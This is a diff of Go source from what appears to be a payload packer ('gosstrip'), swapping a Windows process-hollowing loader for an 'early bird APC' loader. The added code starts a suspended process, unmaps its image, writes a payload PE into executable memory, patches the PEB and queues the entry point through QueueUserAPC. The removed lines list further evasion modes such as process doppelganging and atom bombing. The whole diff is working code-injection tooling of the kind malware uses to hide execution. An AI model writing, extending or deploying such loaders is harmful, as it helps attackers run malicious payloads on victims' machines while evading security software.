@@ -1,106 +1,35 @@
 package windows
 
-import (
-	"fmt"
-
-	common "gosstrip/pack/strategies/common"
-)
-
-// Resolve normalizes the requested mode into a Windows-supported strategy.
-func Resolve(mode common.Mode) (common.Mode, error) {
-	switch mode {
-	case common.ModeOff:
-		return common.ModeOff, nil
-	case common.ModeAuto, common.ModeProcessHollowing:
-		return common.ModeProcessHollowing, nil
-	case common.ModeAtomicBombing:
-		return common.ModeAtomicBombing, nil
-	case common.ModeProcessDoppel:
-		return common.ModeProcessDoppel, nil
-	case common.ModeTransactedHollow:
-		return common.ModeTransactedHollow, nil
-	case common.ModeEarlyBird:
-		return common.ModeEarlyBird, nil
-	case common.ModeEarlyBirdAtomic:
-		return common.ModeEarlyBirdAtomic, nil
-	case common.ModeSelfInjection:
-		return common.ModeSelfInjection, nil
-	case common.ModeNtSyscallReflect:
-		return common.ModeNtSyscallReflect, nil
-	case common.ModeReflectiveLoader:
-		return common.ModeReflectiveLoader, nil
-	case common.ModeMemfd:
-		return common.ModeOff, fmt.Errorf("in-memory mode %q is only available for ELF targets", mode)
-	default:
-		return common.ModeOff, fmt.Errorf("unknown in-memory mode %q", mode)
-	}
-}
-
-// Describe produces a human-friendly summary for logs.
-func Describe(mode common.Mode) string {
-	switch mode {
-	case common.ModeOff:
-		return "temporary file"
-	case common.ModeProcessHollowing:
-		return "in-memory (process hollowing)"
-	case common.ModeAtomicBombing:
-		return "in-memory (atomic bombing)"
-	case common.ModeProcessDoppel:
-		return "in-memory (process doppelganging)"
-	case common.ModeTransactedHollow:
-		return "in-memory (transacted hollowing)"
-	case common.ModeSelfInjection:
-		return "in-memory (self injection)"
-	case common.ModeNtSyscallReflect:
-		return "in-memory (NT-syscall reflective)"
-	case common.ModeEarlyBird:
-		return "in-memory (early bird)"
-	case common.ModeEarlyBirdAtomic:
-		return "in-memory (early bird APC + atoms)"
-	case common.ModeReflectiveLoader:
-		return "in-memory (reflective loader)"
-	default:
-		return fmt.Sprintf("in-memory (%s)", mode)
-	}
-}
-
-// ProcessHollowingRuntime64 embeds the amd64 implementation injected into PE stubs.
-const ProcessHollowingRuntime64 = `
-// executeProcessHollowing esegue il payload usando Process Hollowing
-// Tecnica: crea processo sospeso, unmap originale, mappa nuovo PE, resume
-func executeProcessHollowing(payload []byte) {
-	// 1. Parse PE headers
+// EarlyBirdRuntime64 contains the amd64 implementation for the early-bird APC loader.
+const EarlyBirdRuntime64 = `
+func executeEarlyBird(payload []byte) {
 	if len(payload) < 0x1000 {
 		executeFromTemp(payload)
 		return
 	}
 
-	// DOS Header check
 	if payload[0] != 'M' || payload[1] != 'Z' {
 		executeFromTemp(payload)
 		return
 	}
 
-	// Get PE offset
 	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
 	if peOffset > uint32(len(payload)-4) {
 		executeFromTemp(payload)
 		return
 	}
 
-	// PE signature check
 	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
 		executeFromTemp(payload)
 		return
 	}
 
-	// Parse Optional Header
-	optHeaderOffset := peOffset + 24 // sizeof(IMAGE_FILE_HEADER)
+	optHeaderOffset := peOffset + 24
 	imageBase := binary.LittleEndian.Uint64(payload[optHeaderOffset+24:])
 	sizeOfImage := binary.LittleEndian.Uint32(payload[optHeaderOffset+56:])
+	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optHeaderOffset+60:])
 	addressOfEntryPoint := binary.LittleEndian.Uint32(payload[optHeaderOffset+16:])
 
-	// 2. Crea processo sospeso
 	exePath, _ := os.Executable()
 	var si syscall.StartupInfo
 	var pi syscall.ProcessInformation
@@ -111,7 +40,6 @@ func executeProcessHollowing(payload []byte) {
 		cmdPtr = &cmdLine[0]
 	}
 
-	// CREATE_SUSPENDED = 0x4
 	err := createProcess(
 		syscall.StringToUTF16Ptr(exePath),
 		cmdPtr,
@@ -129,10 +57,7 @@ func executeProcessHollowing(payload []byte) {
 		return
 	}
 
-	// 3. Get thread context per accesso PEB
-	// Full CONTEXT structure (1232 bytes per x64)
 	ctx := make([]byte, 1232)
-	// Set CONTEXT_INTEGER flag (0x00100000 | 0x00000002) at offset 48
 	binary.LittleEndian.PutUint32(ctx[48:], 0x00100002)
 
 	ret, _, _ := procGetThreadCtx.Call(
@@ -145,10 +70,8 @@ func executeProcessHollowing(payload []byte) {
 		return
 	}
 
-	// 4. Extract Rdx (pointer to PEB) - offset 136 in CONTEXT
 	Rdx := binary.LittleEndian.Uint64(ctx[136:])
 
-	// 5. Read actual ImageBase from PEB+16
 	baseAddrBytes := make([]byte, 8)
 	var bytesRead uintptr
 	ret, _, _ = procReadProcessMem.Call(
@@ -165,7 +88,6 @@ func executeProcessHollowing(payload []byte) {
 	}
 	baseAddr := binary.LittleEndian.Uint64(baseAddrBytes)
 
-	// 6. Unmap processo originale
 	ret, _, _ = procNtUnmapView.Call(uintptr(pi.Process), uintptr(baseAddr))
 	if ret != 0 {
 		syscall.TerminateProcess(pi.Process, 1)
@@ -173,34 +95,38 @@ func executeProcessHollowing(payload []byte) {
 		return
 	}
 
-	// 7. Alloca memoria per nuovo PE (prova prima imageBase, poi baseAddr)
 	newBase, _, _ := procVirtualAllocEx.Call(
 		uintptr(pi.Process),
 		uintptr(imageBase),
 		uintptr(sizeOfImage),
-		0x3000, // MEM_COMMIT | MEM_RESERVE
-		0x40,   // PAGE_EXECUTE_READWRITE
+		0x3000,
+		0x40,
 	)
-
 	if newBase == 0 {
 		syscall.TerminateProcess(pi.Process, 1)
 		executeFromTemp(payload)
 		return
 	}
 
-	// 8. Scrivi headers con error check
-	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:0x1000]) {
+	headerSize := sizeOfHeaders
+	if headerSize == 0 || int(headerSize) > len(payload) {
+		headerSize = 0x1000
+		if len(payload) < 0x1000 {
+			headerSize = uint32(len(payload))
+		}
+	}
+	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:headerSize]) {
 		syscall.TerminateProcess(pi.Process, 1)
 		executeFromTemp(payload)
 		return
 	}
 
-	// 9. Scrivi sezioni PE con error check
 	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
-	sectionTableOffset := optHeaderOffset + 240 // sizeof(IMAGE_OPTIONAL_HEADER64)
+	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
+	sectionTableOffset := optHeaderOffset + uint32(optionalSize)
 
 	for i := uint16(0); i < numberOfSections; i++ {
-		sectionOffset := sectionTableOffset + (uint32(i) * 40) // sizeof(IMAGE_SECTION_HEADER)
+		sectionOffset := sectionTableOffset + uint32(i)*40
 		if sectionOffset+40 > uint32(len(payload)) {
 			break
 		}
@@ -222,13 +148,12 @@ func executeProcessHollowing(payload []byte) {
 		}
 	}
 
-	// 10. Update PEB con nuovo ImageBase (CRITICO)
 	newBaseBytes := make([]byte, 8)
 	binary.LittleEndian.PutUint64(newBaseBytes, uint64(newBase))
 	var bytesWritten uintptr
 	ret, _, _ = procWriteProcessMem.Call(
 		uintptr(pi.Process),
-		uintptr(Rdx+16), // PEB+16 = ImageBaseAddress
+		uintptr(Rdx+16),
 		uintptr(unsafe.Pointer(&newBaseBytes[0])),
 		8,
 		uintptr(unsafe.Pointer(&bytesWritten)),
@@ -239,68 +164,21 @@ func executeProcessHollowing(payload []byte) {
 		return
 	}
 
-	// 11. Modifica RCX (entry point) nel context - offset 128 per x64
-	binary.LittleEndian.PutUint64(ctx[128:], uint64(newBase)+uint64(addressOfEntryPoint))
-
-	ret, _, _ = procSetThreadCtx.Call(
-		uintptr(pi.Thread),
-		uintptr(unsafe.Pointer(&ctx[0])),
-	)
-	if ret == 0 {
+	entryPoint := uintptr(newBase) + uintptr(addressOfEntryPoint)
+	apcRet, _, _ := procQueueUserAPC.Call(entryPoint, uintptr(pi.Thread), 0)
+	if apcRet == 0 {
 		syscall.TerminateProcess(pi.Process, 1)
 		executeFromTemp(payload)
 		return
 	}
 
-	// 12. Resume thread
 	procResumeThread.Call(uintptr(pi.Thread))
-}
-
-func createProcess(name *uint16, cmdLine *uint16, procAttr, threadAttr *syscall.SecurityAttributes,
-	inheritHandles bool, flags uint32, env *uint16, dir *uint16,
-	si *syscall.StartupInfo, pi *syscall.ProcessInformation) error {
-
-	r1, _, e1 := procCreateProcess.Call(
-		uintptr(unsafe.Pointer(name)),
-		uintptr(unsafe.Pointer(cmdLine)),
-		uintptr(unsafe.Pointer(procAttr)),
-		uintptr(unsafe.Pointer(threadAttr)),
-		boolToUintptr(inheritHandles),
-		uintptr(flags),
-		uintptr(unsafe.Pointer(env)),
-		uintptr(unsafe.Pointer(dir)),
-		uintptr(unsafe.Pointer(si)),
-		uintptr(unsafe.Pointer(pi)),
-	)
-	if r1 == 0 {
-		return e1
-	}
-	return nil
-}
-
-func writeProcessMemoryChecked(process syscall.Handle, base uintptr, data []byte) bool {
-	var written uintptr
-	ret, _, _ := procWriteProcessMem.Call(
-		uintptr(process),
-		base,
-		uintptr(unsafe.Pointer(&data[0])),
-		uintptr(len(data)),
-		uintptr(unsafe.Pointer(&written)),
-	)
-	return ret != 0 && written == uintptr(len(data))
-}
-
-func boolToUintptr(b bool) uintptr {
-	if b {
-		return 1
-	}
-	return 0
 }
 `
 
-// ProcessHollowingRuntime32 embeds the 32-bit implementation injected into PE stubs.
-const ProcessHollowingRuntime32 = `
-func executeProcessHollowing(payload []byte) {
+// EarlyBirdRuntime32 contains the 32-bit implementation for the early-bird APC loader.
+const EarlyBirdRuntime32 = `
+func executeEarlyBird(payload []byte) {
 	if len(payload) < 0x200 {
 		executeFromTemp(payload)
 		return
@@ -466,15 +344,9 @@ func executeProcessHollowing(payload []byte) {
 		return
 	}
 
-	entryPoint := uint32(uintptr(newBase)) + addressOfEntryPoint
-	binary.LittleEndian.PutUint32(ctx[176:], uint32(newBase))
-	binary.LittleEndian.PutUint32(ctx[184:], entryPoint)
-
-	ret, _, _ = procSetThreadCtx.Call(
-		uintptr(pi.Thread),
-		uintptr(unsafe.Pointer(&ctx[0])),
-	)
-	if ret == 0 {
+	entryPoint := uintptr(newBase) + uintptr(addressOfEntryPoint)
+	apcRet, _, _ := procQueueUserAPC.Call(entryPoint, uintptr(pi.Thread), 0)
+	if apcRet == 0 {
 		syscall.TerminateProcess(pi.Process, 1)
 		executeFromTemp(payload)
 		return
